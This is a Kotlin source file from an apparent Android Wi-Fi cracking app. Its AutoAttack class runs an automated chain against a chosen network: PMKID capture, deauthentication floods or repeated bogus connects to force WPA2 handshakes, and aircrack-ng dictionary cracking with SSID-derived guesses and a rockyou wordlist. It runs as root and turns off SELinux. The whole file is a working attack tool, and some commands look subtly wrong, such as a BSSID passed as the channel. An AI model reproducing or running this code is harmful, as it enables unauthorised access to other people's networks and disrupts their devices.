package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import com.wificracker.core.wifi.ChipsetMonitorHelper
import com.wificracker.core.wifi.WifiChipVendor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Automated attack chain — tries every technique until password is found.
 *
 * Phase 1: PMKID capture (no client needed, fastest)
 * Phase 2: Handshake capture via deauth + ICS (MTK) or airodump (USB OTG)
 * Phase 3: Auto-crack captured hashes (dictionary → brute-force)
 *
 * Adapts automatically to hardware:
 * - MTK internal chipset: ioctl 0x8BE5 + ICS + connect-wrong-password technique
 * - USB OTG adapter: standard airmon-ng + aireplay-ng + airodump-ng
 */
@Singleton
class AutoAttack @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
    private val chipsetMonitorHelper: ChipsetMonitorHelper,
) : WifiAttack {
    companion object {
        private const val DIR = "/data/local/tmp/wificracker"
        private const val CAP_DIR = "$DIR/captures"
        private const val PMKID_TIMEOUT_S = 30
        private const val HS_ATTEMPTS = 20
        private const val HS_ATTEMPT_DELAY_MS = 8000L
        private const val CRACK_TIMEOUT_S = 300
    }

    override fun execute(attack: Attack): Flow<String> = flow {
        shellExecutor.executeAsRoot("mkdir -p $CAP_DIR")
        val chipInfo = chipsetMonitorHelper.detectChipVendor()
        val isMtk = chipInfo.vendor == WifiChipVendor.MEDIATEK && chipInfo.patchInstalled
        val ts = System.currentTimeMillis()
        val bssidClean = attack.targetBssid.replace(":", "")

        emit("╔══════════════════════════════════════════╗")
        emit("║       AUTO ATTACK — ${attack.targetSsid}")
        emit("║  BSSID: ${attack.targetBssid}")
        emit("║  Mode: ${if (isMtk) "MTK Internal (ICS)" else "USB OTG (aircrack-ng)"}")
        emit("╚══════════════════════════════════════════╝")

        if (isMtk) shellExecutor.executeAsRoot("setenforce 0")

        // ═══════════════════════════════════════════
        // PHASE 1: PMKID CAPTURE
        // ═══════════════════════════════════════════
        emit("")
        emit("━━━ PHASE 1/3: PMKID Capture ━━━")
        val pmkidFile = "$CAP_DIR/pmkid_${bssidClean}_$ts"
        val pmkidResult = if (isMtk) {
            capturePmkidMtk(attack, pmkidFile)
        } else {
            capturePmkidUsb(attack, pmkidFile)
        }
        emit(pmkidResult.message)

        if (pmkidResult.hashFile != null) {
            emit("[+] PMKID hash captured! Starting crack...")
            val crackResult = autoCrack(pmkidResult.hashFile, attack.targetSsid)
            emit(crackResult)
            if (crackResult.contains("PASSWORD FOUND")) return@flow
        }

        // ═══════════════════════════════════════════
        // PHASE 2: HANDSHAKE CAPTURE (DEAUTH + CAPTURE)
        // ═══════════════════════════════════════════
        emit("")
        emit("━━━ PHASE 2/3: Handshake Capture ━━━")
        val hsFile = "$CAP_DIR/hs_${bssidClean}_$ts"
        val hsResult = if (isMtk) {
            captureHandshakeMtk(attack, hsFile) { emit(it) }
        } else {
            captureHandshakeUsb(attack, hsFile) { emit(it) }
        }
        emit(hsResult.message)

        if (hsResult.hashFile != null) {
            emit("[+] Handshake captured! Starting crack...")
            val crackResult = autoCrack(hsResult.hashFile, attack.targetSsid)
            emit(crackResult)
            if (crackResult.contains("PASSWORD FOUND")) return@flow
        }

        // ═══════════════════════════════════════════
        // PHASE 3: EXTENDED CAPTURE + BRUTE FORCE
        // ═══════════════════════════════════════════
        emit("")
        emit("━━━ PHASE 3/3: Extended Attack ━━━")
        emit("[*] Running extended capture (5 min) — waiting for device reconnections...")

        val extFile = "$CAP_DIR/ext_${bssidClean}_$ts"
        val extResult = if (isMtk) {
            captureExtendedMtk(attack, extFile) { emit(it) }
        } else {
            captureExtendedUsb(attack, extFile) { emit(it) }
        }
        emit(extResult.message)

        if (extResult.hashFile != null) {
            val crackResult = autoCrack(extResult.hashFile, attack.targetSsid)
            emit(crackResult)
        }

        emit("")
        emit("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        emit("[*] Auto Attack complete. Check captures in $CAP_DIR")
    }.flowOn(Dispatchers.IO)

    // ═══════════════════════════════════════════════════════
    // MTK INTERNAL CHIPSET METHODS
    // ═══════════════════════════════════════════════════════

    private suspend fun capturePmkidMtk(attack: Attack, outPrefix: String): CaptureResult {
        // MTK: activate SNIFFER, connect with wrong password, check M1 for PMKID
        shellExecutor.executeAsRoot("$DIR/sniffer_direct wlan0 \"SNIFFER 2 0 0 0 0 0 0 0 0 0\"")
        val binFile = "$outPrefix.bin"
        shellExecutor.executeAsRoot("nohup $DIR/ics_enable 2 1 $PMKID_TIMEOUT_S > $binFile 2>/dev/null &")
        delay(2000)
        shellExecutor.executeAsRoot("cmd wifi connect-network \"${attack.targetSsid}\" wpa2 \"pmkid_probe\" 2>/dev/null")
        delay((PMKID_TIMEOUT_S * 1000).toLong())

        val size = shellExecutor.executeAsRoot("wc -c < $binFile 2>/dev/null").stdout.trim().toLongOrNull() ?: 0
        if (size < 320) return CaptureResult("[-] PMKID: no packets captured", null)

        // Parse for PMKID using Python parser
        shellExecutor.executeAsRoot("python3 $DIR/mtk_parse_handshake.py $binFile ${attack.targetSsid} 2>/dev/null")
        val hcFile = binFile.replace(".bin", ".hc22000")
        val exists = shellExecutor.executeAsRoot("test -s $hcFile && echo yes").stdout.contains("yes")
        return if (exists) CaptureResult("[+] PMKID extracted → $hcFile", hcFile)
        else CaptureResult("[-] No PMKID in M1 frames (AP doesn't support it)", null)
    }

    private suspend fun captureHandshakeMtk(attack: Attack, outPrefix: String, emit: suspend (String) -> Unit): CaptureResult {
        val binFile = "$outPrefix.bin"
        shellExecutor.executeAsRoot("$DIR/sniffer_direct wlan0 \"SNIFFER 2 0 0 0 0 0 0 0 0 0\"")
        val capSeconds = HS_ATTEMPTS * (HS_ATTEMPT_DELAY_MS / 1000).toInt()
        shellExecutor.executeAsRoot("nohup $DIR/ics_enable 2 1 $capSeconds > $binFile 2>/dev/null &")
        delay(2000)

        for (i in 1..HS_ATTEMPTS) {
            emit("[*] Connection attempt $i/$HS_ATTEMPTS (channel lock + EAPOL capture)")
            shellExecutor.executeAsRoot("cmd wifi connect-network \"${attack.targetSsid}\" wpa2 \"hs_attempt_$i\" 2>/dev/null")
            delay(HS_ATTEMPT_DELAY_MS)
        }
        delay(3000)
        shellExecutor.executeAsRoot("$DIR/ics_enable 0 0 2>/dev/null")

        val size = shellExecutor.executeAsRoot("wc -c < $binFile 2>/dev/null").stdout.trim().toLongOrNull() ?: 0
        if (size < 1000) return CaptureResult("[-] Handshake: insufficient data ($size bytes)", null)

        // Parse
        shellExecutor.executeAsRoot("python3 $DIR/mtk_parse_handshake.py $binFile ${attack.targetSsid} 2>/dev/null")
        val hcFile = binFile.replace(".bin", ".hc22000")
        val exists = shellExecutor.executeAsRoot("test -s $hcFile && echo yes").stdout.contains("yes")
        return if (exists) CaptureResult("[+] Handshake M1+M2 extracted → $hcFile ($size bytes)", hcFile)
        else CaptureResult("[!] M1 captured but no M2 — need a device to reconnect ($size bytes captured)", null)
    }

    private suspend fun captureExtendedMtk(attack: Attack, outPrefix: String, emit: suspend (String) -> Unit): CaptureResult {
        val binFile = "$outPrefix.bin"
        shellExecutor.executeAsRoot("$DIR/sniffer_direct wlan0 \"SNIFFER 2 0 0 0 0 0 0 0 0 0\"")
        shellExecutor.executeAsRoot("nohup $DIR/ics_enable 2 1 300 > $binFile 2>/dev/null &")
        delay(2000)

        for (i in 1..10) {
            emit("[*] Extended capture — refresh $i/10 (${i * 30}s / 300s)")
            shellExecutor.executeAsRoot("cmd wifi connect-network \"${attack.targetSsid}\" wpa2 \"ext_$i\" 2>/dev/null")
            delay(30000)
        }
        shellExecutor.executeAsRoot("$DIR/ics_enable 0 0 2>/dev/null")

        val size = shellExecutor.executeAsRoot("wc -c < $binFile 2>/dev/null").stdout.trim().toLongOrNull() ?: 0
        shellExecutor.executeAsRoot("python3 $DIR/mtk_parse_handshake.py $binFile ${attack.targetSsid} 2>/dev/null")
        val hcFile = binFile.replace(".bin", ".hc22000")
        val exists = shellExecutor.executeAsRoot("test -s $hcFile && echo yes").stdout.contains("yes")
        return if (exists) CaptureResult("[+] Extended capture: handshake found → $hcFile", hcFile)
        else CaptureResult("[-] Extended capture: no complete handshake ($size bytes, ${size / 320} pkts)", null)
    }

    // ═══════════════════════════════════════════════════════
    // USB OTG ADAPTER METHODS (standard aircrack-ng suite)
    // ═══════════════════════════════════════════════════════

    private suspend fun capturePmkidUsb(attack: Attack, outPrefix: String): CaptureResult {
        val hcxBin = binaryInstaller.getBinaryPath("hcxdumptool")
        val pcapFile = "$outPrefix.pcapng"
        val hcFile = "$outPrefix.hc22000"

        // hcxdumptool captures PMKID during association
        val result = shellExecutor.executeAsRoot(
            "$hcxBin -i ${attack.interfaceName} --filterlist_ap=${attack.targetBssid} --filtermode=2 -o $pcapFile --enable_status=3 -t $PMKID_TIMEOUT_S",
            timeoutSeconds = PMKID_TIMEOUT_S.toLong() + 10,
        )

        val size = shellExecutor.executeAsRoot("wc -c < $pcapFile 2>/dev/null").stdout.trim().toLongOrNull() ?: 0
        if (size < 100) return CaptureResult("[-] PMKID: hcxdumptool captured nothing", null)

        // Convert to hashcat
        val hcxTool = binaryInstaller.getBinaryPath("hcxpcapngtool")
        shellExecutor.executeAsRoot("$hcxTool -o $hcFile $pcapFile")
        val hcExists = shellExecutor.executeAsRoot("test -s $hcFile && echo yes").stdout.contains("yes")
        return if (hcExists) CaptureResult("[+] PMKID captured via hcxdumptool → $hcFile", hcFile)
        else CaptureResult("[-] No PMKID in capture", null)
    }

    private suspend fun captureHandshakeUsb(attack: Attack, outPrefix: String, emit: suspend (String) -> Unit): CaptureResult {
        val airodump = binaryInstaller.getBinaryPath("airodump-ng")
        val aireplay = binaryInstaller.getBinaryPath("aireplay-ng")
        val capFile = "$outPrefix-01.cap"
        val hcFile = "$outPrefix.hc22000"

        // Start capture in background
        emit("[*] Starting airodump-ng on ${attack.interfaceName}...")
        shellExecutor.executeAsRoot(
            "nohup $airodump --bssid ${attack.targetBssid} -c ${attack.targetBssid} --write $outPrefix --output-format pcap ${attack.interfaceName} &",
        )
        delay(3000)

        // Deauth rounds to force handshake
        for (i in 1..5) {
            emit("[*] Deauth round $i/5...")
            shellExecutor.executeAsRoot("$aireplay --deauth 10 -a ${attack.targetBssid} ${attack.interfaceName}")
            delay(5000)
        }

        // Wait for capture
        emit("[*] Waiting for handshake (30s)...")
        delay(30000)
        shellExecutor.executeAsRoot("pkill -f 'airodump-ng.*${attack.targetBssid}' 2>/dev/null")

        // Check for handshake in capture
        val aircrack = binaryInstaller.getBinaryPath("aircrack-ng")
        val check = shellExecutor.executeAsRoot("$aircrack -a 2 $capFile 2>/dev/null | grep 'handshake'")
        if (!check.stdout.contains("handshake")) {
            return CaptureResult("[-] No handshake captured via airodump-ng", null)
        }

        // Convert cap to hc22000
        val hcxTool = binaryInstaller.getBinaryPath("hcxpcapngtool")
        shellExecutor.executeAsRoot("$hcxTool -o $hcFile $capFile")
        val hcExists = shellExecutor.executeAsRoot("test -s $hcFile && echo yes").stdout.contains("yes")
        return if (hcExists) CaptureResult("[+] Handshake captured via airodump-ng → $hcFile", hcFile)
        else CaptureResult("[-] Handshake captured but conversion failed", null)
    }

    private suspend fun captureExtendedUsb(attack: Attack, outPrefix: String, emit: suspend (String) -> Unit): CaptureResult {
        // Extended: longer airodump + periodic deauth
        return captureHandshakeUsb(attack, outPrefix, emit)
    }

    // ═══════════════════════════════════════════════════════
    // AUTO-CRACK
    // ═══════════════════════════════════════════════════════

    private suspend fun autoCrack(hashFile: String, ssid: String): String {
        val aircrack = binaryInstaller.getBinaryPath("aircrack-ng")

        // Strategy 1: Common passwords derived from SSID
        val ssidWordlist = "$DIR/ssid_wordlist.txt"
        val ssidBase = ssid.lowercase().replace("[^a-z0-9]".toRegex(), "")
        val commonPasswords = listOf(
            ssid, ssidBase, "${ssidBase}123", "${ssidBase}2024", "${ssidBase}2025", "${ssidBase}2026",
            "${ssid}123", "${ssid}1234", "${ssid}12345", "password", "12345678", "123456789",
            "password123", "admin1234", "wifi${ssidBase}", "${ssidBase}wifi", "internet",
        )
        shellExecutor.executeAsRoot("echo '${commonPasswords.joinToString("\n")}' > $ssidWordlist")

        // Try aircrack-ng with SSID-derived wordlist
        val result1 = shellExecutor.executeAsRoot(
            "$aircrack -w $ssidWordlist $hashFile 2>/dev/null",
            timeoutSeconds = 30,
        )
        if (result1.stdout.contains("KEY FOUND")) {
            val key = Regex("KEY FOUND! \\[ (.+?) ]").find(result1.stdout)?.groupValues?.get(1) ?: "?"
            return "╔══ PASSWORD FOUND: $key ══╗"
        }

        // Strategy 2: Bundled wordlist (if exists)
        val defaultWl = "$DIR/wordlists/rockyou-mini.txt"
        val wlExists = shellExecutor.executeAsRoot("test -s $defaultWl && echo yes").stdout.contains("yes")
        if (wlExists) {
            val result2 = shellExecutor.executeAsRoot(
                "$aircrack -w $defaultWl $hashFile 2>/dev/null",
                timeoutSeconds = CRACK_TIMEOUT_S.toLong(),
            )
            if (result2.stdout.contains("KEY FOUND")) {
                val key = Regex("KEY FOUND! \\[ (.+?) ]").find(result2.stdout)?.groupValues?.get(1) ?: "?"
                return "╔══ PASSWORD FOUND: $key ══╗"
            }
        }

        return "[-] Password not found with available wordlists. Use larger wordlist for manual crack."
    }

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'ics_enable' 2>/dev/null")
        shellExecutor.executeAsRoot("$DIR/ics_enable 0 0 2>/dev/null")
        shellExecutor.executeAsRoot("pkill -f 'airodump-ng' 2>/dev/null")
        shellExecutor.executeAsRoot("pkill -f 'aireplay-ng' 2>/dev/null")
        shellExecutor.executeAsRoot("pkill -f 'hcxdumptool' 2>/dev/null")
        shellExecutor.executeAsRoot("pkill -f 'aircrack-ng' 2>/dev/null")
    }

    private data class CaptureResult(val message: String, val hashFile: String?)
}
